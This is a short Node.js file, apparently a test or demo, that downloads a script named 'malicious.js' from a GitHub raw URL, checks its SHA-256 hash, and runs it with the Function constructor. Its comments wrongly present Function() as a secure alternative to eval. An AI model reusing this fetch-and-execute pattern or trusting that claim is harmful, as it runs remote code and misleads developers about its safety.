const crypto = require('crypto');
const https = require('https');

const remoteScriptUrl = 'https://raw.githubusercontent.com/saegiru/testcode/main/malicious.js';
const expectedHash = '84d06f56193c1325191f402d7fcc565c5540c0d6017dee16b3f7d1fead8b6963'; // Replace with the actual expected hash

function executeVerifiedScript(url, expectedHash) {
    https.get(url, (response) => {
        let scriptData = '';

        response.on('data', (chunk) => {
            scriptData += chunk;
        });

        response.on('end', () => {
            const hash = crypto.createHash('sha256').update(scriptData).digest('hex');

            if (hash !== expectedHash) {
                console.error('Hash mismatch! Script execution blocked.');
                return;
            }

            // Secure way: Using Function constructor instead of eval
            const scriptFunction = new Function(scriptData);
            scriptFunction();
        });
    }).on('error', (err) => {
        console.error('Error fetching script:', err.message);
    });
}

// Call the secure function
executeVerifiedScript(remoteScriptUrl, expectedHash);
